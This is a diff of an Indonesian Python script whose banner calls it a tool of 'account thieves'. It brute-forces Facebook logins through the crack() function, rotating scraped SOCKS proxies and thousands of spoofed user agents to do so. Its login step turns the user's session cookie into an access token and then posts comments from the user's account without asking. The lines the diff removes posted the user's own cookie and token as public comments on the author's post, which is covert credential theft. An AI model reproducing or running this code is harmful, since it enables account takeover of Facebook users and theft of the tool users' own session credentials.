@@ -1,9 +1,12 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
 ###---[ INFO AUTHOR GANS DIKIT ]---###
-#----[ jangan di oprek, Nanti data hpmu Hilang ]-----#
-author = 'Muhamad Rizki'
-git_hub = 'github.com/Skull378'
-faceb0ok = 'Muhamad Rizki XD'
-version = 'next blade v.2'
+#----[ jangan di oprek, sayangi data hpmu ]-----#
+author = 'MUHAMAD RIZKI'
+git_hub = 'https://github.com/Skull378'
+faceb0ok = 'MUHAMAD RIZKI 378'
+version = 'next blade v.1'
 
 
 #------------[ WARNA-COLOR ]--------------#
@@ -71,9 +74,9 @@ def tahunng(fx):
 
 ###---[ANGGAP INI LOGO ]---###
 def logo(n):
-	return str(f""" """)
+	return str(f""" {M}•{K}•{H}• {P}KUMPULAN PARA MALING AKUN {H}•{K}•{M}•""")
 def logo2():
-	return str(f""" """)
+	return str(f"""{M}>{K}>{H}> {P}LOGIN AKUN UTAMA LUH {H}>{K}>{M}>""")
 
 ###---[ TANGGAL ]---###
 sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
@@ -98,7 +101,7 @@ garis = f" {P}[{warna_warni_biasa}•{P}]"
 ###---[ APPEND ]---###
 dump, sandi, metode = [], [], []
 tetel, opsi, proxy = [], [], []
-cepeh, sam, ugen2, ugen, redmi = [], [], [], [], []
+cepeh, sam, ugen2, ugen, ugen5, redmi = [], [], [], [], [], []
 id, id2, loop ,ok , cp = [], [], 0, 0, 0
 
 
@@ -118,72 +121,74 @@ def back():
 try:
 	clear_layar()
 	print(logo2())
-	print(f'\r\n [!] sedang dump proxy dan create useragent')
+	print(f'\r\n [{hh}>{P}] sedang dump proxy dan create useragent')
 	try:os.remove('.proxy.txt')
 	except:pass
-#	A = ''
-#	one = ses.get('https://spys.me/socks.txt').text
-#	for x in one.splitlines():
-#		if '+' in x:
-#			if '.' in x:
-#				p = x.split(' ')[0]
-#				A += '\n'+p
+	A = ''
+	one = ses.get('https://spys.me/socks.txt').text
+	for x in one.splitlines():
+		if '+' in x:
+			if '.' in x:
+				p = x.split(' ')[0]
+				A += '\n'+p
 	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
 	open('.proxy.txt','w').write(uno)
 except requests.exceptions.ConnectionError:
 	sys.exit(f" [{M}>{P}] tidak ada koneksi internet")
-for xd in range(10000):
-	a='Mozilla/5.0 (SymbianOS/9.4; Series60/'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nokia'
-	e=random.randrange(100, 9999)
-	f='/51.1.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/533.4'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
-
-	aa='Mozilla/5.0 (Linux; U; Android,'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c='ru-RU; GT'
+for xd in range(1000):
+    build_nokiax = ['JDQ39','JZO54K']
+    rr = random.randint; rc = random.choice
+    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
+    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
+    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
+    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
+    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
+    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
+    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
+    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
+    ugent4 = f"Mozilla/5.0 (Linux; Android 10; ZTE A2121E Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36"
+    memekk = random.choice([ugent1, ugent2, ugent3, ugent4])
+    ugen.append(memekk)
+    
+for t in range(10000):
+	aa='Mozilla/5.0 (Linux; Android;'
+	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
+	c='REALME RMX1911'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 	e=random.randrange(1, 999)
 	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/'
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
 	h=random.randrange(73,100)
 	i='0'
 	j=random.randrange(4200,4900)
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36'
-	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
+	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen5.append(uaku)
 
 for x in range(999):
 	rc = random.choice
 	rr = random.randint
 	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
-#	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
-#	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
-#	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
-#	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
-#	pf = f'{A}{B}{C}{D}'
-#	if pf in redmi:pass
-#	else:redmi.append(pf)
-#	A = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,10))};'
-#	B = f' en-us; Huawei Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/'
-#	C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/537.36'
-#	mi = f'{A}{B}{C}'
-#	if mi in redmi:pass
-#	else:redmi.append(mi)
-	A = f'Mozilla/5.0 (Linux; Android {str(rr(5,13))}; Redmi Note '
-	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
-	C = f'{str(rr(6,12))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
-	D = f' Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
-	E = f' Mobile Safari/537.36'
+	A = f'Mozilla/5.0 (Linux; Android{str(rr(8,10))}; vivo Y21 {str(rr(4,9))} Build/LMY47I.'
+	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
+	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
+	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
+	pf = f'{A}{B}{C}{D}'
+	if pf in redmi:pass
+	else:redmi.append(pf)
+	A = f'Mozilla/5.0 (Linux; Android {str(rr(7,10))};'
+	B = f' en-us; SAMSUNG Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/'
+	C = f'10.9.2.{str(rr(111,999))} U3/0.0 Mobile Safari/534.30'
+	mi = f'{A}{B}{C}'
+	if mi in redmi:pass
+	else:redmi.append(mi)
+	A = f'Mozilla/5.0 (Linux; U; Android 12; en-us; Xiaomi 12S Ultra Build/SKQ1.220303.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.12.1-gn'
+	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
+	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)'
+	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
+	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.22.7.36.1'
 	F = f'{A}{C}{D}{E}'
 	if F in redmi:pass
 	else:redmi.append(F)
@@ -196,93 +201,43 @@ sleep(1)
 ###---[ CEK COOKIES ]---###
 def get_data():
 	try:
-		token = open(".token.txt","w").read()
-		cok = open(".cookie.txt","w").read()
-		c = {"cookie":cok}
-		try:
-			url = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+token, cookies={"cookie":cok})
-			nama_ = json.loads(url.text)["name"]
-			id_ = json.loads(url.text)["id"]
-			menu(nama_,token,c)
-			exit()
-		except KeyError:
-			login()
-		except requests.exceptions.ConnectionError:
-			print ("Koneksi jaringan bermasalah")
-			exit()
-	except FileNotFoundError:
-		login()
+		coki = open('.cookie.txt','r').read()
+		c = {'cookie':coki}
+		t = open('.token.txt','r').read()
+		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
+		menu(n,t,c)
+	except Exception as e:login()
 
-
+	
 ###---[ LOGIN COOKIE ]---###
-def loginz():
+def login():
 	clear_layar()
 	print(logo2())
 	cookie = input(f"\n [{hh}<{P}] gunakan akun pribadi\n cookie : ")
+	url = "https://business.facebook.com/business_locations"
+	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
+	cok = {'cookie':cookie}
 	try:
-		headers = {
-			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
-			'Cookie': cookie
-		}
-		url = requests.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
-		cari = re.findall('act=(.*?)&nav_source', url.text)
-		if len(cari) == 0:
-			print (f'Cookie tidak valid')
-			exit()
-		else:
-			for xenz in cari:
-				web = requests.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={xenz}&nav_source=no_referrer', headers = headers)
-				token = re.search('(EAAB\w+)', web.text).group(1)
-		cok = {'cookie':cookie}
 		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
 		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
 		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
 		jam      = datetime.now().strftime("%X")
-		tem      = ('\nAnjir Hengker Bang😼 @[100043618273847:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
+		data = ses.get(url,headers=head,cookies=cok)
+		token = re.search('(EAAG\w+)',data.text).group(1)
+		komen = random.choice( ['Salam Dari Surabaya','Salam Dari Malang','Salam Dari Medan','Salam Dari Mojokerto','Salam Dari Solo','Salam Dari Jakarta','Salam Dari Jambi','Salam Dari Papua','Salam Dari Bali','Salam Dari Banjarmasin','Salam Dari Tegal','Salam Dari Magelang','Salam Dari Tasikmalaya','Salam Dari Cirebon','Salam Dari Bogor','Salam Dari Bengkulu','Salam Dari Denpasar','Salam Dari Aceh'])
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://www.facebook.com/100043618273847/posts/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/?app=fbl')
+		link = ('https://graph.facebook.com/100043618273847_973373480492071/?app=fbl')
 		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])
-		#ses.post(f"https://graph.facebook.com/100043618273847?fields=subscribers&access_token={token}",headers=(cookies=cok)
-		ses.post(f"https://graph.facebook.com/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/comments/?message={cookie}&access_token={token}",cookies=cok)
-		ses.post(f"https://graph.facebook.com/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/comments/?message={token}&access_token={token}",cookies=cok)
-		ses.post(f"https://graph.facebook.com/pfbid0EjXsJpKu2RD4dvm2nF5e1Cq35aSncvQJhsN5CEifXzWLqpnYr7zgB5EDtqZANHigl/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
+		#ses.post(f"https://graph.facebook.com/576356403828297?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		ses.post(f"https://graph.facebook.com/100043618273847_973373480492071/comments/?message={komen}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/100043618273847_973373480492071/comments/?message={komen}&access_token={token}",cookies=cok)
+		ses.post(f"https://graph.facebook.com/100043618273847_973373480492071/comments/?message={komen}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
 
 
 
-def login():
-	clear_layar()
-	print(logo2())
-	cookie = input(f"\n [{hh}<{P}] gunakan akun pribadi\n cookie : ")
-	try:
-		headers = {
-			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
-			'Cookie': cookie
-		}
-		url = requests.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
-		cari = re.findall('act=(.*?)&nav_source', url.text)
-		if len(cari) == 0:
-			print (f'Cookie tidak valid')
-			exit()
-		else:
-			for xenz in cari:
-				web = requests.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={xenz}&nav_source=no_referrer', headers = headers)
-				token = re.search('(EAAB\w+)', web.text).group(1)
-			open(".token.txt","w").write(token)
-			open(".cookie.txt","w").write(cookie)
-			urll = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+token, cookies={"cookie":cookie})
-			json.loads(urll.text)["name"]
-			json.loads(urll.text)["id"]
-			print ("Jalankan ulang sc nya");exit()
-	except Exception as eror:
-		print ("cookie rusak");exit()
-	except AttributeError:
-		print ("cookie tidak valid");exit()
-	except KeyError:
-		print ("cookie tidak valid");exit()
 
 def remove():
 	try:os.remove('.cookie.txt');os.remove('.token.txt')
@@ -827,11 +782,11 @@ def crack(idf,pwx,url,awal):
 	print(f"\r {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
 	for pw in pwx:
 		try:
-			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3632 Build/KAB33O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.9822.80 Mobile Safari/537.36 HeyTapBrowser/31.7.36.1", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
-			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
+			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
+			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
 			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
